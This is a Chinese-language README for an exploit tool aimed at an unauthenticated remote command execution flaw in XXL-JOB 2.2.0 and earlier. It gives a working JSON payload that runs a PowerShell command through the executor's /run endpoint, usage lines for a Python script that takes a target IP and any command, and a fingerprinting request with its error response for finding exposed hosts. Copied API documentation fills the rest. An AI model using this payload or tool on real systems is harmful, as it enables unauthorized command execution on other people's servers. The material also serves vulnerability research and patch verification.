# xxl-job-rce

XXL-JOB是一个分布式任务调度平台，其核心设计目标是开发迅速、学习简单、轻量级、易扩展。
在xxl-job<= 2.2.0版本存在未授权命令执行


官方GitHub地址：https://github.com/xuxueli/xxl-job

官方文档https://www.xuxueli.com/xxl-job/

## payload:
```
{
  "jobId": 1,
  "executorHandler": "demoJobHandler",
  "executorParams": "demoJobHandler",
  "executorBlockStrategy": "COVER_EARLY",
  "executorTimeout": 0,
  "logId": 1,
  "logDateTime": 1586629003729,
  "glueType": "GLUE_POWERSHELL",
  "glueSource": "calc",
  "glueUpdatetime": 1586699003758,
  "broadcastIndex": 0,
  "broadcastTotal": 0
}
```
## 工具使用截图
### 用法:
python3 xxl-job-rce.py [IP Address] -p [Prot(default 9999)] -c [Command] -m[Ccript Method(default powershell)]'
python3 xxl-job-poc.py 192.168.229.146 -c calc
python3 xxl-job-poc.py 192.168.229.146 -c calc -m shell -p 9999

![image](https://github.com/mrknow001/xxl-job-rce/blob/main/xxl-job-powershell.png)
![image](https://github.com/mrknow001/xxl-job-rce/blob/main/xxl-job-python.png)


## 根据异常报错指纹-快速发现目标机器

```
POST /run HTTP/1.1
Host: 127.0.0.1:9999
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0


```
```
HTTP/1.1 200 OK
content-type: text/html;charset=UTF-8
content-length: 646

{
  "code": 500,
  "msg": "request error:java.lang.NullPointerException
	at com.xxl.job.core.biz.impl.ExecutorBizImpl.run(ExecutorBizImpl.java:49)
	at com.xxl.job.core.server.EmbedServer$EmbedHttpServerHandler.process(EmbedServer.java:201)
	at com.xxl.job.core.server.EmbedServer$EmbedHttpServerHandler.access$200(EmbedServer.java:138)
	at com.xxl.job.core.server.EmbedServer$EmbedHttpServerHandler$1.run(EmbedServer.java:166)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
	at java.lang.Thread.run(Thread.java:745)
"
}
```

## 官方公开api
### 调度中心 RESTful API

API服务位置：com.xxl.job.core.biz.AdminBiz （ com.xxl.job.admin.controller.JobApiController ）
API服务请求参考代码：com.xxl.job.adminbiz.AdminBizTest

#### 任务回调
```
    说明：执行器执行完任务后，回调任务结果时使用
    ------
    地址格式：{调度中心跟地址}/callback
    Header：
        XXL-JOB-ACCESS-TOKEN : {请求令牌}
    请求数据格式如下，放置在 RequestBody 中，JSON格式：
        [{
            "logId":1,              // 本次调度日志ID
            "logDateTim":0,         // 本次调度日志时间
            "executeResult":{
                "code": 200,        // 200 表示任务执行正常，500表示失败
                "msg": null
            }
        }]
    响应数据格式：
        {
          "code": 200,      // 200 表示正常、其他失败
          "msg": null      // 错误提示消息
        }
```

#### 执行器注册

```
    说明：执行器注册时使用，调度中心会实时感知注册成功的执行器并发起任务调度
    ------
    地址格式：{调度中心跟地址}/registry
    Header：
        XXL-JOB-ACCESS-TOKEN : {请求令牌}
    请求数据格式如下，放置在 RequestBody 中，JSON格式：
        {
            "registryGroup":"EXECUTOR",                     // 固定值
            "registryKey":"xxl-job-executor-example",       // 执行器AppName
            "registryValue":"http://127.0.0.1:9999/"        // 执行器地址，内置服务跟地址
        }
    响应数据格式：
        {
          "code": 200,      // 200 表示正常、其他失败
          "msg": null      // 错误提示消息
        }
```

#### 执行器注册摘除

```
    说明：执行器注册摘除时使用，注册摘除后的执行器不参与任务调度与执行
    ------
    地址格式：{调度中心跟地址}/registryRemove
    Header：
        XXL-JOB-ACCESS-TOKEN : {请求令牌}
    请求数据格式如下，放置在 RequestBody 中，JSON格式：
        {
            "registryGroup":"EXECUTOR",                     // 固定值
            "registryKey":"xxl-job-executor-example",       // 执行器AppName
            "registryValue":"http://127.0.0.1:9999/"        // 执行器地址，内置服务跟地址
        }
    响应数据格式：
        {
          "code": 200,      // 200 表示正常、其他失败
          "msg": null      // 错误提示消息
        }
```

### 执行器 RESTful API

API服务位置：com.xxl.job.core.biz.ExecutorBiz
API服务请求参考代码：com.xxl.job.executorbiz.ExecutorBizTest

#### 心跳检测

```
说明：调度中心检测执行器是否在线时使用
------
地址格式：{执行器内嵌服务跟地址}/beat
Header：
    XXL-JOB-ACCESS-TOKEN : {请求令牌}
请求数据格式如下，放置在 RequestBody 中，JSON格式：
响应数据格式：
    {
      "code": 200,      // 200 表示正常、其他失败
     }
```

#### 忙碌检测

```
    说明：调度中心检测指定执行器上指定任务是否忙碌（运行中）时使用
    ------
    地址格式：{执行器内嵌服务跟地址}/idleBeat
    Header：
        XXL-JOB-ACCESS-TOKEN : {请求令牌}
    请求数据格式如下，放置在 RequestBody 中，JSON格式：
        {
            "jobId":1       // 任务ID
        }
    响应数据格式：
        {
          "code": 200,      // 200 表示正常、其他失败
          "msg": null       // 错误提示消息
        }
```

#### 触发任务

```
    说明：触发任务执行
    ------
    地址格式：{执行器内嵌服务跟地址}/run
    Header：
        XXL-JOB-ACCESS-TOKEN : {请求令牌}
    请求数据格式如下，放置在 RequestBody 中，JSON格式：
        {
            "jobId":1,                                  // 任务ID
            "executorHandler":"demoJobHandler",         // 任务标识
            "executorParams":"demoJobHandler",          // 任务参数
            "executorBlockStrategy":"COVER_EARLY",      // 任务阻塞策略，可选值参考 com.xxl.job.core.enums.ExecutorBlockStrategyEnum
            "executorTimeout":0,                        // 任务超时时间，单位秒，大于零时生效
            "logId":1,                                  // 本次调度日志ID
            "logDateTime":1586629003729,                // 本次调度日志时间
            "glueType":"BEAN",                          // 任务模式，可选值参考 com.xxl.job.core.glue.GlueTypeEnum
            "glueSource":"xxx",                         // GLUE脚本代码
            "glueUpdatetime":1586629003727,             // GLUE脚本更新时间，用于判定脚本是否变更以及是否需要刷新
            "broadcastIndex":0,                         // 分片参数：当前分片
            "broadcastTotal":0                          // 分片参数：总分片
        }
    响应数据格式：
        {
          "code": 200,      // 200 表示正常、其他失败
          "msg": null       // 错误提示消息
        }
```

#### 终止任务

```
    说明：终止任务
    ------
    地址格式：{执行器内嵌服务跟地址}/kill
    Header：
        XXL-JOB-ACCESS-TOKEN : {请求令牌}
    请求数据格式如下，放置在 RequestBody 中，JSON格式：
        {
            "jobId":1       // 任务ID
        }
    响应数据格式：
        {
          "code": 200,      // 200 表示正常、其他失败
          "msg": null       // 错误提示消息
        }
```

#### 查看执行日志

```
    说明：终止任务，滚动方式加载
    ------
    地址格式：{执行器内嵌服务跟地址}/log
    Header：
        XXL-JOB-ACCESS-TOKEN : {请求令牌}
    请求数据格式如下，放置在 RequestBody 中，JSON格式：
        {
            "logDateTim":0,     // 本次调度日志时间
            "logId":0,          // 本次调度日志ID
            "fromLineNum":0     // 日志开始行号，滚动加载日志
        }
    响应数据格式：
        {
            "code":200,         // 200 表示正常、其他失败
            "msg": null         // 错误提示消息
            "content":{
                "fromLineNum":0,        // 本次请求，日志开始行数
                "toLineNum":100,        // 本次请求，日志结束行号
                "logContent":"xxx",     // 本次请求日志内容
                "isEnd":true            // 日志是否全部加载完
            }
        }
```

## 参考链接

https://www.xuxueli.com/xxl-job/

https://github.com/jas502n/xxl-job

https://github.com/xuxueli/xxl-job/
